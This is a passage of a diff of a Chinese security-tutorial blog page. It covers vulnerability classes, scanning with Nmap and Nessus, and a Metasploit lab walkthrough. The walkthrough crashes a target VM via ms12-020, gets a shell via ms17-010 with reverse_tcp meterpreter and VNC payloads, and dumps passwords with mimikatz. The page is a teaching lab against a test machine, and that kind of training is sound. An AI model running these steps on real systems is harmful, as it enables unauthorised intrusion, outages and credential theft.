-<p>（2）设计漏洞：主要是指软件、硬件和固件在设计时对于安全性考虑不周而导致的漏洞。</p>
-<p>例如F5 BIG-ip远程绕过验证漏洞是由于F5设备的SSH登录模块内置了一个可用于登录的密钥文件，这个密钥被泄露后任意获取该密钥的用户都可以登录一台相关版本的设备。</p>
-<p>（3）配置漏洞：是由于软件的默认配置或者不恰当的配置导致的安全漏洞。</p>
-<p>例如弱口令或默认口令就是一种常见的配置漏洞。</p>
-<h3 id="漏洞实例"><a href="#漏洞实例" class="headerlink" title="漏洞实例"></a>漏洞实例</h3><p>（1)微软的RPC漏洞与蠕虫病毒</p>
-<table>
-<thead>
-<tr>
-<th align="center">时间</th>
-<th align="center">漏洞</th>
-<th align="center">危害</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center">2003年</td>
-<td align="center">RPC(远程过程调用协议)接口中的缓冲区溢出   冲击波蠕虫病毒</td>
-<td align="center">席卷全球80%的计算机</td>
-</tr>
-<tr>
-<td align="center">2008年</td>
-<td align="center">MS08-067漏洞，基于445端口(共享打印机/文件)   Conficker(飞客蠕虫病毒)</td>
-<td align="center">感染1500万台以上计算机</td>
-</tr>
-<tr>
-<td align="center">2017年</td>
-<td align="center">永恒之蓝(MS17-010)漏洞，基于445端口  Wannacry(勒索病毒)</td>
-<td align="center">造成80亿美元以上经济损失</td>
-</tr>
-</tbody></table>
-<p>（2）漏洞的危害：远程控制、信息泄露、拒绝服务、权限提升</p>
-<h3 id="漏洞的信息组成"><a href="#漏洞的信息组成" class="headerlink" title="漏洞的信息组成"></a>漏洞的信息组成</h3><p>（1）漏洞名称</p>
-<p>（2）发布日期</p>
-<p>（3）漏洞编号</p>
-<p>（4）风险等级</p>
-<p>（5）影响范围</p>
-<p>（6）漏洞描述</p>
-<p>（7）解决方案</p>
-<h3 id="漏洞信息管理"><a href="#漏洞信息管理" class="headerlink" title="漏洞信息管理"></a>漏洞信息管理</h3><p>（1）CVE(Common Vulnerabliities &amp; Exposures,通用漏洞披露)</p>
-<p>（2）美国国家漏洞数据库(NVD)</p>
-<p>（3）<a target="_blank" rel="noopener" href="http://cve.mitre.org/">http://cve.mitre.org</a> CVE官网</p>
-<p>（4）<a target="_blank" rel="noopener" href="http://www.cnnvd.org.cn/index.htm">http://www.cnnvd.org.cn/index.html</a> 国家信息安全漏洞库</p>
-<p>（5）<a target="_blank" rel="noopener" href="http://www.nsfocus.net/">http://www.nsfocus.net/</a> 绿盟科技</p>
-<p>（6）<a target="_blank" rel="noopener" href="http://www.scap.org.cn/">http://www.scap.org.cn/</a> SCAP 安全内容自动化协议中文社区</p>
-<p>（7）微软安全公告</p>
-<h2 id="安全漏洞的检测技术"><a href="#安全漏洞的检测技术" class="headerlink" title="安全漏洞的检测技术"></a>安全漏洞的检测技术</h2><h3 id="漏洞检测技术"><a href="#漏洞检测技术" class="headerlink" title="漏洞检测技术"></a>漏洞检测技术</h3><p>寻找漏洞方法：</p>
-<p>（1）静态分析：人为查看代码(分析代码)</p>
-<p>（2）动态分析：使用工具nmap(端口)、nessus(服务、OS)、msf(扫描、验证)进行漏洞扫描</p>
-<p>利用漏洞实时攻击：<br>（1）静态：人为写payload</p>
-<p>（2）动态：工具msf</p>
-<h3 id="常见的系统漏洞扫描器"><a href="#常见的系统漏洞扫描器" class="headerlink" title="常见的系统漏洞扫描器"></a>常见的系统漏洞扫描器</h3><p>（1）系统漏洞扫描器是相对于WEB应用漏洞扫描器而言的，主要是针对操作系统和各类通用性较强的软件应用进行漏洞检测的工具。</p>
-<p>（2）软件类：NESSUS、OpenVAS、Nmap</p>
-<p>（3）硬件类：绿盟科技远程安全评估系统、网御漏洞扫描系统、榕基风险管理系统、杭州迪普漏洞扫描系统、启明天镜脆弱性扫描与管理系统</p>
-<h3 id="系统漏洞扫描的基本流程"><a href="#系统漏洞扫描的基本流程" class="headerlink" title="系统漏洞扫描的基本流程"></a>系统漏洞扫描的基本流程</h3><p>存活判断–&gt;端口扫描–&gt;服务识别–&gt;系统识别–&gt;弱口令/登录扫描–&gt;漏洞映射</p>
-<h3 id="漏洞识别原理"><a href="#漏洞识别原理" class="headerlink" title="漏洞识别原理"></a>漏洞识别原理</h3><p>漏洞识别的主要方法可以分为原理扫描和推断扫描两类，在实际实现的过程中，扫描器开发者会根据漏洞的特点不同而选择不同的漏洞识别技术，进行漏洞识别。</p>
-<table>
-<thead>
-<tr>
-<th align="center">识别技术</th>
-<th align="center">检测思路</th>
-<th align="center">准确率</th>
-<th align="center">检测效率</th>
-<th align="center">对目标的影响</th>
-<th align="center">适用场景</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center">原理扫描</td>
-<td align="center">利用漏洞形成的原因和漏洞的特点尝试对漏洞进行利用，并根据漏洞利用的结果来判断漏洞是否存在</td>
-<td align="center">高</td>
-<td align="center">步骤多，检测速度慢</td>
-<td align="center">对目标影响较大，可能导致目标宕机或破坏程序和数据</td>
-<td align="center">常用于WEB应用漏洞扫描和一些利用后不影响系统运行的漏洞，尤其不适用于拒绝服务漏洞。</td>
-</tr>
-<tr>
-<td align="center">推断扫描</td>
-<td align="center">推断扫描不直接利用漏洞，而是寻找其他漏洞存在的证据，并以此推断漏洞存在。版本检查是推断扫描的常用方式之一</td>
-<td align="center">受实现技术和漏洞修复技术的影响，有一定的误报率</td>
-<td align="center">过程简单，速度较快</td>
-<td align="center">不利用漏洞，对目标影响较小</td>
-<td align="center">适用于通用软件的扫描，在大规模的扫描任务中有比较明显的优势。</td>
-</tr>
-</tbody></table>
-<h3 id="利用Nmap扫描漏洞"><a href="#利用Nmap扫描漏洞" class="headerlink" title="利用Nmap扫描漏洞"></a>利用Nmap扫描漏洞</h3><p>（1）常见的Nmap脚本扫描，命令格式如下：</p>
-<pre><code>nmap --script=&lt;类别参数&gt;
-##常用的脚本扫描参数：
-vuln:负责检查目标机是否有常见的漏洞(Vulnerability),如是否有MS08_067</code></pre>
-<p>（2）例子：</p>
-<pre><code>ifconfig           //先查看本机所在网段
-nmap --sP 192.168.14.0/24     //扫描本网段中存活的主机
-nmap --script=vuln 192.168.14.131    //扫描靶机是否有常见的漏洞</code></pre>
-<p><img src="https://i.loli.net/2020/12/06/mDLr54RPzpfkiI6.png" alt="image-20201206140811838"></p>
-<p><img src="https://i.loli.net/2020/12/06/osvrzTiFplNQ82E.png"></p>
-<h2 id="Nessus介绍与漏洞扫描"><a href="#Nessus介绍与漏洞扫描" class="headerlink" title="Nessus介绍与漏洞扫描"></a>Nessus介绍与漏洞扫描</h2><h3 id="NESSUS简介"><a href="#NESSUS简介" class="headerlink" title="NESSUS简介"></a>NESSUS简介</h3><p>目前最多人使用的<strong>系统漏洞扫描与分析软件</strong>,具有能够提供完整的电脑漏洞扫描服务，并随时更新其漏洞数据库。可同时在本机或远端上遥控，进行系统的漏洞分析扫描，运作效能随着系统的资源而自行调整。可自行定义插件(Plug-in)等特性。</p>
-<h3 id="NESSUS的功能介绍"><a href="#NESSUS的功能介绍" class="headerlink" title="NESSUS的功能介绍"></a>NESSUS的功能介绍</h3><p>（1）打开浏览器输入<a href="https://localhost:8834进入登录页面输入账号密码登录(这里使用的是虚拟机进行操作，若要在物理机上登录NESSUS，可在浏览器中输入https://192.168.14.132:8834，其中192.168.14.132是虚拟机的IP地址)">https://localhost:8834进入登录页面输入账号密码登录(这里使用的是虚拟机进行操作，若要在物理机上登录NESSUS，可在浏览器中输入https://192.168.14.132:8834，其中192.168.14.132是虚拟机的IP地址)</a></p>
-<p>（2）在首页选择new scans 或者 Creat a new scan新建一个扫描任务，新建任务时需要对扫描进行选择或者配置，带有upgrade标签的是需要升级成企业版或者专业版才能使用，这里选择免费的“Basic Network Scan进行配置。</p>
-<p><img src="https://i.loli.net/2020/12/06/AdDqFb3GT81k6f7.png" alt="image-20201206142030678"></p>
-<p><img src="https://i.loli.net/2020/12/06/m71ce3RjDa9odwA.png" alt="image-20201206142222469"></p>
-<p>（3）通常情况下，只对General(一般选项)、Discovery(主机发现)、Assessment(风险评估)、及Advanced(高级选项)进行配置。</p>
-<p><img src="https://i.loli.net/2020/12/06/fCsbW2ah5jeyw4B.png" alt="image-20201206142758916"></p>
-<h3 id="常见漏洞扫描器的使用方法"><a href="#常见漏洞扫描器的使用方法" class="headerlink" title="常见漏洞扫描器的使用方法"></a>常见漏洞扫描器的使用方法</h3><p>选择任务类型–&gt;填写扫描目标–&gt;选择扫描模板/插件–&gt;高级选项(可默认)–&gt;扫描报告选项–&gt;开始扫描</p>
-<h3 id="NESSUS的使用"><a href="#NESSUS的使用" class="headerlink" title="NESSUS的使用"></a>NESSUS的使用</h3><p>（1）设置项目名称、归属栏目为my scans，输入目标主机IP或网段</p>
-<p><img src="https://i.loli.net/2020/12/06/PJ5tnvolMpHh8Aa.png" alt="image-20201206153948858"></p>
-<p>（2）点击Launch开始扫描，可在首页查看扫描记录，点击对应的扫描任务可查看任务的详细信息，可导出</p>
-<p><img src="https://i.loli.net/2020/12/06/hygtJVelpXWNBFm.png" alt="image-20201206144435278"></p>
-<p><img src="https://i.loli.net/2020/12/06/MFipyxdWQketaKr.png" alt="image-20201206145449869"></p>
-<p>（3）选择扫描任务进入后可查看扫描信息</p>
-<p><img src="https://i.loli.net/2020/12/06/cKR5VoZiCFrJhAz.png" alt="image-20201206145610763"></p>
-<p>（4）点击要查看的漏洞，可获取该漏洞的介绍、漏洞对应的解决方案、生成原因、涉及到的端口和主机信息，可导出。</p>
-<p><img src="https://i.loli.net/2020/12/06/sd3Nc12RA8PX6TG.png" alt="image-20201206150013091"></p>
-<h3 id="NESSUS的报告解读"><a href="#NESSUS的报告解读" class="headerlink" title="NESSUS的报告解读"></a>NESSUS的报告解读</h3><p>漏洞风险等级、漏洞描述、漏洞涉及服务端口</p>
-<h2 id="Metasploit-msf-介绍与漏洞利用"><a href="#Metasploit-msf-介绍与漏洞利用" class="headerlink" title="Metasploit(msf)介绍与漏洞利用"></a>Metasploit(msf)介绍与漏洞利用</h2><p>Metasploit就是一个漏洞利用框，简称MSF。作为全球最受欢迎的工具，不仅仅因为它的方便和强大，更重要的是它的框架。它允许使用者开发自己的漏洞脚本，从而进行测试。</p>
-<h3 id="Metasploit常用的命令"><a href="#Metasploit常用的命令" class="headerlink" title="Metasploit常用的命令"></a>Metasploit常用的命令</h3><p>（1）show exploits   显示可用的渗透攻击模块</p>
-<p>（2）search               用来搜寻一些渗透攻击模块，可以进行模糊匹配</p>
-<p>（3）use                    使用某个渗透攻击模块，可以通过use命令来使用show或search出来的渗透模块</p>
-<p>（4）show options  显示参数当选择渗透模块后，使用show options会显示该模块所需设置的参数，熟练后可不      用</p>
-<p>（5）set                    用来设置某些选项，比如使用set命令设置攻击模块的options参数；设置攻击载荷payloads</p>
-<p>（6）exploit             设置完所有参数时，使用exploit命令，开始进行攻击，也可用run</p>
-<h3 id="Metasploit攻击流程与思路"><a href="#Metasploit攻击流程与思路" class="headerlink" title="Metasploit攻击流程与思路"></a>Metasploit攻击流程与思路</h3><p>搜索攻击模块–&gt;利用攻击模块–&gt;查看与配置选项–&gt;进行攻击</p>
-<p>（1）搜寻攻击模块：search + 漏洞信息或编号</p>
-<p>（2）使用某个模块：use</p>
-<p>（3）查看配置选项：show options</p>
-<p>（4）设置选项值：set</p>
-<p>（5）开始攻击：exploit/run</p>
-<h3 id="ms12-020漏洞利用"><a href="#ms12-020漏洞利用" class="headerlink" title="ms12-020漏洞利用"></a>ms12-020漏洞利用</h3><p>（1）在kali里打开metasploit漏洞利用框架，也可直接在终端中输入命令msfconsole打开</p>
-<p><img src="https://i.loli.net/2020/12/06/Uv5pFWO3dfyA9x2.png" alt="image-20201206161452095"></p>
-<p>（2）搜索ms12-020漏洞利用模块</p>
-<pre><code>search ms12-020
-auxiliary/dos/windows/rdp/ms12_020_maxchannelids</code></pre>
-<p><img src="https://i.loli.net/2020/12/06/Qx1cHIsEkjU4hCv.png" alt="image-20201206161732437"></p>
-<p>（3）使用模块use+模块名,可用table键补全，也可以use+模块前的编号(如0,1,2….)</p>
-<p><img src="https://i.loli.net/2020/12/06/3qy5Cd9RaYbInSm.png" alt="image-20201206161936099"></p>
-<p>（4）查看当前模块所需配置项show options，有”yes”的地方需要配置参数，其中RHOST需设置为远程靶机的IP地址</p>
-<p><img src="https://i.loli.net/2020/12/06/Hy6SwYbgshczuTV.png" alt="image-20201206162138879"></p>
-<p>（5）设置配置项，这一步配置好后，可以再次执行show options命令查看是否设置成功</p>
-<pre><code>set RHOST 192.168.14.131      //192.168.14.131为靶机的IP</code></pre>
-<p><img src="https://i.loli.net/2020/12/06/qSI5pXsAk6TDtrW.png" alt="image-20201206162349469"></p>
-<p>（6）实施攻击exploit或run，可发现靶机蓝屏</p>
-<p><img src="https://i.loli.net/2020/12/06/4kCD1JwWvxX7Bhd.png" alt="image-20201206162544164"></p>
-<p><img src="https://i.loli.net/2020/12/06/ELmSMNu4rqGJTsO.png" alt="image-20201206162959336"></p>
-<h3 id="ms17-010漏洞利用"><a href="#ms17-010漏洞利用" class="headerlink" title="ms17-010漏洞利用"></a>ms17-010漏洞利用</h3><p>（1）在kali里打开metasploit漏洞利用框架，也可直接在终端中输入命令msfconsole打开</p>
-<p>（2）搜索ms17-010漏洞利用模块</p>
-<p>（3）使用模块use+模块名，不同的攻击模块效果不同，这里使用第三个攻击模块</p>
-<p><img src="https://i.loli.net/2020/12/06/5qv39wEAKTyGPox.png" alt="image-20201206163607554"></p>
-<p>（4）show options</p>
-<p><img src="https://i.loli.net/2020/12/06/Adl2F3oyBrD86sI.png" alt="image-20201206163718981"></p>
-<p>（5）设置配置项，这一步配置好后，可以再次执行show options命令查看是否设置成功</p>
-<pre><code>set RHOST 192.168.14.131       //192.168.14.131为靶机的IP</code></pre>
-<p>（6）开始攻击exploit/run，可发现获取了靶机的shell界面，Ctrl+C退出该shell界面</p>
-<p><img src="https://i.loli.net/2020/12/06/hPi6Of7QCVS2Lnw.png" alt="image-20201206164237163"></p>
-<p>（7）但是存在乱码，解决方法：”终端”–&gt;”设定字符编码”–&gt;”简体中文—GB2312”</p>
-<p><img src="https://i.loli.net/2020/12/06/39vQqjzUVWZ2wgM.png" alt="image-20201206164518356"></p>
-<p><img src="https://i.loli.net/2020/12/06/HgTtuQGAfwh2m8b.png" alt="image-20201206164717015"></p>
-<p>（8）利用获取的shell界面，在靶机桌面创建一个1.txt文档。</p>
-<pre><code>cd /users/ndsec/Desktop
-edit 1.txt</code></pre>
-<p>（9）利用ms17-010漏洞进行实时监控靶机</p>
-<pre><code>set payload windows/x64/vncinject/reverse_tcp</code></pre>
-<p><img src="https://i.loli.net/2020/12/06/zUqP5EeRxMYHwod.png" alt="image-20201206165435030"></p>
-<p>（10）利用ms17-010漏洞获取靶机密码</p>
-<pre><code>set payload windows/x64/meterpreter/reverse_tcp
-exploit/run
-load mimikatz        //加载模块获取密码
-msv                  //利用mimikatz的msv获取密文hash
-kerberos             //获取明文密码</code></pre>
-<p><img src="https://i.loli.net/2020/12/06/kaUPCm1t3sovcnL.png" alt="image-20201206171203722"></p>
-<p><img src="https://i.loli.net/2020/12/06/o6sd89qRGHfbme3.png" alt="image-20201206172505028"></p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">安全初级</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2020/12/06/%E5%AE%89%E5%85%A8%E5%88%9D%E7%BA%A7/%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E9%AA%8C%E8%AF%81/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
   
     <nav id="page-nav">
       <a class="extend prev" rel="prev" href="/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/3/">Next &amp;raquo;</a>
@@ -2966,6 +3867,10 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">安全进阶</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">deepin</a>
               </li>
             
             <div class="clearfix"></div>
